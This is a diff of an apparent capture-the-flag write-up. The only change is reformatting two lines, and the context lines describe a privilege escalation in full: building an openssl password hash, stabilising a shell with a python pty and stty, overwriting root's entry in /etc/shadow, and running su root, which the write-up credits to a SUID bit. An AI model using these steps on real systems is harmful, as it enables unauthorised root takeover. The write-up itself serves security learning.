@@ -39,8 +39,8 @@ I was in the root group and could access /root directory and read the root flag,
 - openssl passwd -6 -salt xyz test -> Generated a hashed password, I used ‘test’. </br>
 - Made an interactive shell, so I could edit it with vim/nano: </br>
 - python3 -c 'import pty; pty.spawn("/bin/bash")' </br>
-**B.** Ctrl + Z to background my shell, stty raw -echo </br>
-**C.** stty raw -echo;fg </br>
+B. Ctrl + Z to background my shell, stty raw -echo </br>
+C. stty raw -echo;fg </br>
 - nano /etc/shadow -> pasted the new hashed password to root. </br>
 - su root, entered 'test' password, and it worked: </br> </br>
 **Vulnerability Exploited:** Suid Binary Bit Set </br>
